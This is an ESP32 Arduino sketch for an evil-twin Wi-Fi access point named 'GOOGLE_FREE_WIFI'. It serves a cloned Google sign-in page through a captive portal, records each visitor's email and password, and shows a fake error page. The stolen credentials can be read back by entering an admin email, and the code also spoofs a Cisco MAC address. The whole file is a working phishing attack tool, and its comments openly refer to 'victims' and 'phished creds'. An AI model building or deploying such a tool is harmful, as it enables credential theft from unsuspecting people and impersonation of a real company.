#include <Arduino.h> //not needed in the arduino ide

// Captive Portal
#include <AsyncTCP.h> //https://github.com/me-no-dev/AsyncTCP using the latest dev version from @me-no-dev
#include <DNSServer.h>
#include <ESPAsyncWebServer.h> //https://github.com/me-no-dev/ESPAsyncWebServer using the latest dev version from @me-no-dev
#include <esp_wifi.h>          //Used for mpdu_rx_disable android workaround

const char *ssid = "GOOGLE_FREE_WIFI"; // FYI The SSID can't have a space in it.
const char *password = NULL; // no password

const char *admin_email_address = "p@t.com"; // admin email address to view phished data

#define MAX_CLIENTS 4 // ESP32 supports up to 10 but I have not tested it yet
#define WIFI_CHANNEL                                                           \
  6 // 2.4ghz channel 6
    // https://en.wikipedia.org/wiki/List_of_WLAN_channels#2.4_GHz_(802.11b/g/n/ax)

const IPAddress localIP(4, 3, 2, 1); // the IP address the web server, Samsung
                                     // requires the IP to be in public space
const IPAddress gatewayIP(4, 3, 2,
                          1); // IP address of the network should be the same as
                              // the local IP for captive portals
const IPAddress subnetMask(
    255, 255, 255,
    0); // no need to change: https://avinetworks.com/glossary/subnet-mask/

const String localIPURL =
    "http://4.3.2.1"; // a string version of the local IP with http, used for
                      // redirecting clients to your webpage

const char *PARAM_INPUT_1 = "input1"; // email address
const char *PARAM_INPUT_2 = "input2"; // password

String stringCreds; // used to store the username password combos via appending data
#define ONBOARD_LED 2 // this is the blue LED on ESP32 WROOM boards


// Set your new MAC Address
uint8_t newMACAddress[] = {0xAC, 0x44, 0xF2, 0x1A, 0x26, 0x01}; // this is a CISCO OUI

// Google Captive Portal page with form
const char index_html[] PROGMEM = R"=====(
  <!DOCTYPE html> <html>
<head>
        <title>Open WiFi – Google Login</title>
    
        <meta charset='UTF-8'>
        <meta name='viewport' content='width=device-width,
                        initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>
    
        <style>
            .login-page {
                width: 360px;
                padding: 8% 0 0;
                margin: auto;
            }
    
            .form {
                position: relative;
                z-index: 1;
                background: #F7F7F7;
                max-width: 360px;
                margin: 0 auto 100px;
                padding: 45px;
                text-align: center;
                box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);
            }
    
            .form input {
                font-family: 'Roboto', sans-serif;
                outline: 0;
                background: #ffffff;
                width: 100%;
                border: 0;
                margin: 0 0 15px;
                padding: 15px;
                box-sizing: border-box;
                font-size: 14px;
                border-radius: 10px;
                border: 1px solid #83b5f7;
            }
    
            .form button {
                font-family: 'Roboto', sans-serif;
                outline: 0;
                background: #4E8FF4;
                width: 100%;
                border: 0;
                padding: 15px;
                color: #FFFFFF;
                font-size: 14px;
                -webkit-transition: all 0.3 ease;
                transition: all 0.3 ease;
                cursor: pointer;
                border-radius: 10px;
            }
    
            .form button:hover,
            .form button:active,
            .form button:focus {
                background: rgb(#1a73e8);
            }
            .form .message a {
                color: #4E8FF4;
                text-decoration: none;
            }
            .container .info h1 {
                margin: 0 0 15px;
                padding: 0;
                font-size: 36px;
                font-weight: 300;
                color: #1a1a1a;
            }
            .container .info span {
                color: #4d4d4d;
                font-size: 12px;
            }
            .container .info span a {
                color: #000000;
                text-decoration: none;
            }
            body {
                background: #ffffff;
                font-family: 'Roboto', sans-serif;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
            }
            .logo {
                background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHQAAAAmCAYAAAAV3L/bAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3wsKCQE65xcGUwAACYRJREFUeNrtW2tsHNUVXrO7jkMhCq9SHgGkhkdRSbFnxjEhMDszjmMKIgTqFGgrIkCJQBTKQ21VCiu8Oxv4EQSNgCCEQIjysCpRaAVl18ZFhHdIoEATiknIw4n3kdiemXXiR3Z6znofd+7M7s6sndiR50pX6+yMr+fMd8853/nOjcfjjpk9WoIDJwqyukKQtbVCWH1NlLUu+DkG80X4+U8BWbk0GNSPcd/UNB/SGq1eDGmviiFlBIDTy81ASNkhhtXftT6emTXT31vDS8u35if78rXrp/yB+GD8OPDE9QBkphKQZmC1b6RImpvJgLKvXKcT859TC+aaA+dAKP1vGdD6YfZkPVJWRi1BlZVh8NY2F9ApBlQIDZ0thpVdFiBtBYDuaH546CyPrtfk728L6rVCSLlclNVnSXADsraPD2sXu4BOIaBXBfVjwTP/Q3sakKG72zp0b8XN0D54fiCsfDLTwZw2gIph7VGDV4aUIfA8wVnu1eukyOB5M50UTTmgfGRgPuTEMQOg4fRyl+cfpYAGZPUpEkysL11YjlJAmad1P5QaAySgze2D5x7JZ9A9nppU88KfxEXmFwmJvRk/ky3MBfi947WCnmOGO/0Lxrr8N4x0+lbj53DUf5GuO1+raW1mthRSA1JEuwnSz6+xLidJ4WQAmmptnBNv5pYmRO7WhNh4S1JsFLbzfN0EmO3gIiOjVd8/YkC2XVibENm7EgKzLSFxusXsAXDv0BnGX2mtzJueWQDgvTB3jHb6dXqOxLzb4dpdeoentjIX6J+Lqhi8D9XE+EPaFiGiteQUst356RTQlNh0RkJinosL3DBtd5/ADcRFtr0qYIGZ3m4Mt2r4SICZ4hvP7JO4z0oASc+PEksbTiu5MWJ1Z412ejdbAWmaMf/GTPfsM0uSQ1m5EOb3ZQUUEFwgqn1NfucEUPRCsL2/kt19IvNpL8+c7IzdymrESIa0lfZYsfK57SmrBqP2tF58SkLgvrM0ROA0S+ME5puBlqYTTZ75tueHAOY2GjgIsxkIvQP4aQbV+20m5jmJXgvrbACqz0LWHBtn/aVBtgsopJR68MwhCxuTfRKzy/w+mA8wklVdrkDO+KW9jeBEElQOUEa9Rj10Kikyq/v5n83F6wOLF58Ql7jb+iR2P3kffPcy/RwjMd/rBiA7/fHhmP/mzAbP8blQPGck5l8F36eMIdjXYXRzvQbCaSf17D2BcHoZCih4HUsyIaw8Xy2gOs/7IFd+SQOWEpnGPF/YI9SfDXa+YbhH5O63n0PD6kPGh0uvnnxAiwbvDTQspB42Eefr51v9Dbh+HoJtAHUJVxAtRqK+Jsor9x7onnWO1VoHo7Xn0qDCvxuISCXQYPJB5WRrJ1BD1QA6TvrIDcq+87/W+aZmRrK5/nTwVoWIToNInux66Eoq5P7FZsjdWG6CYjRIKE7pAkgi9wRpVFLiflXu78BuvcnwEkTu0fw1AOVJEqCxqH9FubUAwJVUPn2ssLFl9TkDl4hoPy8joPiycqhDQMH2vxVAkrhMXGj4Mcn0c5v9BUg7B+nQm5TYVTZzKJIAY7fEDjW3se5mw5rFcPtF0ShGqZQfcAfDvSpJFAqARr1fEN7Zr3d7fGVZdbenDkBNkwSJiDg9xHtIVurvwsa/3ymgwF530nb0XsUci6VaKYIIaWcjXsf7bNYOeg3szm2UhstPBExsiBuUJ+ipFowi8iJ438d21gNq/0kx57DxgsfF/PsL4ET9tsotIFCbiJCbKABk7Pm+WzFVRdJXOweUGSNSzYa4wK6lecL4ZA5gSQNeWV0bkt5tkCM+siPIly6F1DsN4SucXlUElKDrIvuhnfWyZQuRcwuAglcSIfQ9W4CCVxKApgrPTGxAiCjvVLZRu7IKDz1UoVT5FuY9VmzemZYLhTR40X5KYGivLtSqp8JaCYLyHwR2eFIRHOYrIpzs19vaym4cZIZYaBNF9yYi5H5FhNwkiAbl19ro8cN9anETeDcXc6iyk4hQuyulHcix900k5BL2HELWDyF4Capck9dtkbVbaOYGaskfneRTZIWQOz8tR7KA2T1jLJ4brykbbilmCHNd0du8zxhJTu2ycmuNdfqvp2rSJwj7OwzyZ0hZXC5NAeifOSZFEtthJHjsX/e1sPNK/ZmdTU2zJ6DDQR0may+ZSw7179j4rvTrUL820woLqFC9mE8N4bOZ5Q1GCdyOUipQjr7vJu9HJlgoW7p8lxtqS5D9Mm95LNfK/KtuHoTYPVQtekkxhKaXGdOEsgl7xJbeKau/raZsSQrs1ZR3bipFdrAezXq0yK6xKm1s9zOh5HjbQhjA0wgdEGZ+AwAvuCysndYSGponRYYuwYNh8N2HFsdQ0oFIeqGVEA+0PEaDCsAty4ffbJgVueV0iAIS8Q/jHvTUQAiNUqDuHI3WXptnvBhmsZyB73upGtSg4CBnoL0OG/Z8OM3moxRuTrB3jdVZK1vCAoRUZLeUWPIxbtK8sJDVt5u5FWD/nuI9zNdkieNooCoyfqTEmXBgBFPbVy5kYZiBXLrXTNEZBUjTVrJMIa7tivPcj0yeB7os7Xk5wNKQY3sA8CGTUB/17bbyZF5Wf2olyOfkwB5Tz7gK6Q+7SCQnKG5WZt84KTLLgsjyJxZ+x9WQNiQHjgEF+QwPmlVaHw3DboodcR5265ZSalJWBeqqPR/BsyXOR71bUTUq3X2CM1ImgmiedKnnRJxHqc9qQ1vXocy7KIVOzkkGCMFYcmAZU0GrHQXw3wQCdIUTEpVctOh4IEnhUp0HZMEQkh7au2TBDyq2z0C7hZJERkHeCshczdoOYn7FtTCdACF8BWw6ZLFhEwDmjSCZPkJ2X5y2z7INCpF9crzmtGpGcL3weSemn8PS7losK6egHIaEAIz9M/YDEWxsAOM53omsjX2/pNAoogEwH8BPbDFVQwZQDQIvlLD3CfNB/Bzt8orYL3W6FnIFIaTegLbCZv0D2o+bfPyUh7aOCMkD1dqOmzohNV6ZFLl7AeAHsf8bX8JcetiAnIkDa2kbZV5XsTRTPnff2jQbSAaxdYiyH4oheHCu1L3YNzWeQ1afct/gNBtQolxH5covMeSaeQX8NxFZ66ZqdcF9g9NsYHcFQPw3XX5hvxh026W5c0S/F0Pqdgr4DZPRnXLHYRjokYGQ+p2TertcaHbHNAHVHFIt6+0tKES4b+xoGFldO30NHm4jT17kVKQuKGFuzZ4zcsfRCW5rMDUHp5sr3eEOdzgf/wd5MUlMEIOkpwAAAABJRU5ErkJggg==');
                background-size: 116px 38px;
                background-repeat: no-repeat;
                float: none;
                margin: 40px auto 30px;
                display: block;
                height: 38px;
                width: 116px;
            }
            .banner {
                text-align: center;
            }
            .banner h1 {
                font-family: 'Roboto', sans-serif;
                -webkit-font-smoothing: antialiased;
                color: #555;
                font-size: 42px;
                font-weight: 300;
                margin-top: 0;
                margin-bottom: 20px;
            }
            .banner h2 {
                font-family: 'Roboto', sans-serif;
                -webkit-font-smoothing: antialiased;
                color: #555;
                font-size: 18px;
                font-weight: 400;
                margin-bottom: 20px;
            }

            .banner h3 {
                font-family: 'Roboto', sans-serif;
                -webkit-font-smoothing: antialiased;
                color: #555;
                font-size: 12px;
                font-weight: 400;
                margin-bottom: 10px;
            }

            a {
                color: #4E8FF4;
            }

            .circle-mask {
                display: block;
                height: 96px;
                width: 96px;
                overflow: hidden;
                border-radius: 50%;
                margin-left: auto;
                margin-right: auto;
                z-index: 100;
                margin-bottom: 10px;
                background-size: 96px;
                background-repeat: no-repeat;
                background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAADACAAAAAB3tzPbAAACOUlEQVR4Ae3aCQrrIBRG4e5/Tz+CBAlIkIAECUjoSt48z/GZeAvnrMCvc6/38XzxAAAAYC4AAAAAAAAAAAAAAAAAAAAAAAAAAAAMCAAAAAAAAAAAAAAAAPsagz4V4rq/FmCLTj/k4vYqgCN5/TKfjlcAJKff5pJ5QPH6Y77YBiz6a4thQJ30D03VKmB3+qfcbhOwO+l+waP/+VsEBgDV6USumgNMOtVkDbDoZIstQNHpiimA1+m8JUBSQ8kO4HBqyB1mAElNJTMAr6a8FcCmxjYjgKjGohGAU2POBmBXc7sJwKrmVhOAqOaiCUBQc8EEQO0JwPMB4ADASwhAe3yR8VPiP3/M8XOaPzQd/lLyp56xSuvnUGK0yHC313idCw6umNov+bhm5aK7fdWAZQ/WbdoXnlg5Y+mvfe2SxVdWj20FAAAAAAAAAAAAwFQAAJSS0hwmfVMIc0qlmAfsOQWvP+RDyrtNQM1L0D8WllxNAWqOXifzMVcbgG3xaswv22jAFp3a6zFteYw8fQ9DM6Amr275VG8GlFmdm8uNgDzpgqZ8EyB7XZTPNwDKpAubysWAOuvi5nolYHW6PLdeBjiCbikc1wCK0025cgUg68Zyf0DUrcXegKibi30Bq25v7QnYNKCtH+BwGpA7ugFmDWnuBSgaVOkECBpU6AOoGlbtAlg1rLULIGhYoQvAaViuC0AD6wE4Xh1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADA194CuqC6onikxXwAAAAASUVORK5CYII=');
                -webkit-transition: opacity 0.075s;
                -moz-transition: opacity 0.075s;
                -ms-transition: opacity 0.075s;
                -o-transition: opacity 0.075s;
                transition: opacity 0.075s;
            }
            .login-form #g:hover {
                border: 1px solid #0953b3;
            }
            .login-form #l:hover {
                background-color: #3577e0;
            }
            .login-form #l:active{
                background-color: #326ac4;
            }
        </style>
    </head>

<body>
    <div class='logo' aria-label='Google'></div>
    <div class='banner'>
            <h1>
                    Google free wifi
                </h1>
            <h2 class='hidden-small'>
                    Sign in with your Google account to continue.
                </h2>
                <h3 class='hidden-small'>
                    By using this service you agree to the Google <a href="url">terms of service</a>.
                </h3>
        </div>
    <div class='login-page'>
            <div class='form'>
                    <form class='login-form' action='/get' method='GET'>
                            <div class='circle-mask'></div>
                            <br>
                            <input id='email' type='email' placeholder='Email' name='input1' required />
                            <input id='password' type='password' placeholder='Password' name='input2' required />
                            <input type='hidden' name='url' value='google.com'>
                            <button id='loginbutton' type='submit'>Login</button>
                        </form>
                </div>
        </div>
</body>
</html>
)=====";

// Error page where we re-direct clients after capturing their data
const char error_html[] PROGMEM = R"=====(
  <!DOCTYPE html> <html>
<head>
        <title>Open WiFi – Google Login</title>
    
        <meta charset='UTF-8'>
        <meta name='viewport' content='width=device-width,
                        initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>
    
        <style>
            .login-page {
                width: 360px;
                padding: 8% 0 0;
                margin: auto;
            }
    
            .container .info h1 {
                margin: 0 0 15px;
                padding: 0;
                font-size: 36px;
                font-weight: 300;
                color: #1a1a1a;
            }
            .container .info span {
                color: #4d4d4d;
                font-size: 12px;
            }
            .container .info span a {
                color: #000000;
                text-decoration: none;
            }
            body {
                background: #ffffff;
                font-family: 'Roboto', sans-serif;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
            }
            
            .banner {
                text-align: center;
            }
            .banner h1 {
                font-family: 'Roboto', sans-serif;
                -webkit-font-smoothing: antialiased;
                color: #555;
                font-size: 42px;
                font-weight: 300;
                margin-top: 0;
                margin-bottom: 20px;
            }
            .banner h2 {
                font-family: 'Roboto', sans-serif;
                -webkit-font-smoothing: antialiased;
                color: #555;
                font-size: 18px;
                font-weight: 400;
                margin-bottom: 20px;
            }



        </style>
    </head>

<body>
    <div class='logo' aria-label='Google'></div>
    <div class='banner'>
            <h1>
                    Connection Error
                </h1>
            <h2 class='hidden-small'>
                    Service currently unavailible.
                </h2>
        </div>
</body>
</html>
)=====";

DNSServer dnsServer;
AsyncWebServer server(80);

void setUpDNSServer(DNSServer &dnsServer, const IPAddress &localIP) {
// Define the DNS interval in milliseconds between processing DNS requests
#define DNS_INTERVAL 30

  // Set the TTL for DNS response and start the DNS server
  dnsServer.setTTL(3600);
  dnsServer.start(53, "*", localIP);
}

void startSoftAccessPoint(const char *ssid, const char *password,
                          const IPAddress &localIP,
                          const IPAddress &gatewayIP) {
// Define the maximum number of clients that can connect to the server
#define MAX_CLIENTS 4
// Define the WiFi channel to be used (channel 6 in this case)
#define WIFI_CHANNEL 6

  // Set the WiFi mode to access point and station
  WiFi.mode(WIFI_MODE_AP);

  // Define the subnet mask for the WiFi network
  const IPAddress subnetMask(255, 255, 255, 0);

  // Configure the soft access point with a specific IP and subnet mask
  WiFi.softAPConfig(localIP, gatewayIP, subnetMask);

  // Start the soft access point with the given ssid, password, channel, max
  // number of clients
  WiFi.softAP(ssid, password, WIFI_CHANNEL, 0, MAX_CLIENTS);

  // Disable AMPDU RX on the ESP32 WiFi to fix a bug on Android
  esp_wifi_stop();
  esp_wifi_deinit();
  wifi_init_config_t my_config = WIFI_INIT_CONFIG_DEFAULT();
  my_config.ampdu_rx_enable = false;
  esp_wifi_init(&my_config);
  esp_wifi_start();
  vTaskDelay(100 / portTICK_PERIOD_MS); // Add a small delay
}

void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP) {
  //======================== Webserver ========================
  // WARNING IOS (and maybe macos) WILL NOT POP UP IF IT CONTAINS THE WORD
  // "Success" https://www.esp8266.com/viewtopic.php?f=34&t=4398 SAFARI (IOS) IS
  // STUPID, G-ZIPPED FILES CAN'T END IN .GZ
  // https://github.com/homieiot/homie-esp8266/issues/476 this is fixed by the
  // webserver serve static function. SAFARI (IOS) there is a 128KB limit to the
  // size of the HTML. The HTML can reference external resources/images that
  // bring the total over 128KB SAFARI (IOS) popup browser has some severe
  // limitations (javascript disabled, cookies disabled)

  // Required
  server.on("/connecttest.txt", [](AsyncWebServerRequest *request) {
    request->redirect("http://logout.net");
  }); // windows 11 captive portal workaround
  server.on("/wpad.dat", [](AsyncWebServerRequest *request) {
    request->send(404);
  }); // Honestly don't understand what this is but a 404 stops win 10 keep
      // calling this repeatedly and panicking the esp32 :)

  // Background responses: Probably not all are Required, but some are. Others
  // might speed things up? A Tier (commonly used by modern systems)
  server.on("/generate_204", [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
  }); // android captive portal redirect
  server.on("/redirect", [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
  }); // microsoft redirect
  server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
  }); // apple call home
  server.on("/canonical.html", [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
  }); // firefox captive portal call home
  server.on("/success.txt", [](AsyncWebServerRequest *request) {
    request->send(200);
  }); // firefox captive portal call home
  server.on("/ncsi.txt", [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
  }); // windows call home

  // B Tier (uncommon)
  //  server.on("/chrome-variations/seed",[](AsyncWebServerRequest
  //  *request){request->send(200);}); //chrome captive portal call home
  //  server.on("/service/update2/json",[](AsyncWebServerRequest
  //  *request){request->send(200);}); //firefox?
  //  server.on("/chat",[](AsyncWebServerRequest
  //  *request){request->send(404);}); //No stop asking Whatsapp, there is no
  //  internet connection server.on("/startpage",[](AsyncWebServerRequest
  //  *request){request->redirect(localIPURL);});

  // return 404 to webpage icon
  server.on("/favicon.ico", [](AsyncWebServerRequest *request) {
    request->send(404);
  }); // webpage icon

  // Serve Basic HTML Page
  server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response =
        request->beginResponse(200, "text/html", index_html);
    response->addHeader(
        "Cache-Control",
        "public,max-age=31536000"); // save this file to cache for 1 year
                                    // (unless you refresh)
    request->send(response);
    Serial.println("Served Basic HTML Page");
  });

  // the catch all
  server.onNotFound([](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
    Serial.print("onnotfound ");
    Serial.print(request->host()); // This gives some insight into whatever was
                                   // being requested on the serial monitor
    Serial.print(" ");
    Serial.print(request->url());
    Serial.print(" sent redirect to " + localIPURL + "\n");
  });
}

void setup() {

  // Turn off the ESP32 onboard blue LED	
  pinMode(ONBOARD_LED, OUTPUT);
  digitalWrite(ONBOARD_LED, LOW);

  // Set the transmit buffer size for the Serial object and start it with a baud
  // rate of 115200.
  Serial.setTxBufferSize(1024);
  Serial.begin(115200);

  Serial.println();
  Serial.print("[OLD] ESP32 Board MAC Address:  ");
  Serial.println(WiFi.macAddress());
  
  // ESP32 Board add-on after version > 1.0.5
  esp_wifi_set_mac(WIFI_IF_STA, &newMACAddress[0]);
  
  Serial.print("[NEW] ESP32 Board MAC Address:  ");
  Serial.println(WiFi.macAddress());


  // Wait for the Serial object to become available.
  while (!Serial)
    ;

  // Print a welcome message to the Serial port.
  Serial.println("\n\nCaptive Test, V0.5.0 compiled " __DATE__ " " __TIME__
                 " by CD_FER"); //__DATE__ is provided by the platformio ide
  Serial.printf("%s-%d\n\r", ESP.getChipModel(), ESP.getChipRevision());

  startSoftAccessPoint(ssid, password, localIP, gatewayIP);

  setUpDNSServer(dnsServer, localIP);

  setUpWebserver(server, localIP);
  server.begin();

  Serial.print("\n");
  Serial.print("Startup Time:"); // should be somewhere between 270-350 for
                                 // Generic ESP32 (D0WDQ6 chip, can have a
                                 // higher startup time on first boot)
  Serial.println(millis());
  Serial.print("\n");
  // Send a GET request to <ESP_IP>/get?input1=<inputMessage>
  server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;
    // GET input1 value on <ESP_IP>/get?input1=<inputMessage>
    // if (request->hasParam(PARAM_INPUT_1)) {
    // get email address from form
    inputMessage = request->getParam(PARAM_INPUT_1)->value();
    inputParam = PARAM_INPUT_1;

    // is it our admin email address?
    if (inputMessage == admin_email_address) {
      Serial.println("Management login");
	  // dump phished creds to webpage
      request->send(200, "<code>", stringCreds);
    } else {
		// its not the Management address, save the victim email address
      stringCreds += inputMessage; // += is append operator
      stringCreds += ":";
    }
    // get password from form
    inputMessage = request->getParam(PARAM_INPUT_2)->value();
    stringCreds += inputMessage;
    stringCreds += "\n";

    // serve the error page so the victim thinks the service is currently down
    request->send(200, "text/html", error_html);

    // turn on onboard blue LED to signify phishing has worked and we have a victim
    digitalWrite(ONBOARD_LED, HIGH);

	// Stop the AP to eject the Phished user
	// esp_wifi_stop();
	// delay(2000);
	//  esp_wifi_start();
  });
}

void loop() {
  dnsServer.processNextRequest(); // I call this atleast every 10ms in my other
                                  // projects (can be higher but I haven't
                                  // tested it for stability)
  delay(DNS_INTERVAL); // seems to help with stability, if you are doing other
                       // things in the loop this may not be needed
}